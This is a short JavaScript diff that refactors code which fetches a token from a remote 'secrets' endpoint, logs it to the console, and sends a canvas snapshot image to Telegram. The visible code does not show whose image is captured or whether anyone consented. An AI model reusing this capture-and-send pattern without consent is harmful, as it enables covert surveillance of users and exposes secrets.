@@ -49,19 +49,18 @@ function takeSnapshot() {
 }
 
 async function fetchEnvVariables() {
-  fetch('https://upload-jpg.vercel.app/api/secrets')
-  .then(response => response.json())
-  .then(data => {
+  try {
+    const response = await fetch('https://upload-jpg.vercel.app/api/secrets');
+    const data = await response.json();
     if (data.error) {
       console.error('Error:', data.error);
     } else {
       env = data.secret;
       console.log('env set', env);
     }
-  })
-  .catch(error => {
+  } catch (error) {
     console.error('Error fetching secret:', error);
-  });
+  }
 }
 
 async function sendToTelegram(imageDataUrl) {
@@ -96,11 +95,7 @@ async function sendToTelegram(imageDataUrl) {
 }
 
 async function runSequentially() {
-  try {
-    await fetchEnvVariables();
-    await sendToTelegram(img.canvas.toDataURL());
-  } catch (error) {
-    console.error('Error:', error);
-  }
+  await fetchEnvVariables();
+  await sendToTelegram(img.canvas.toDataURL());
 }
 
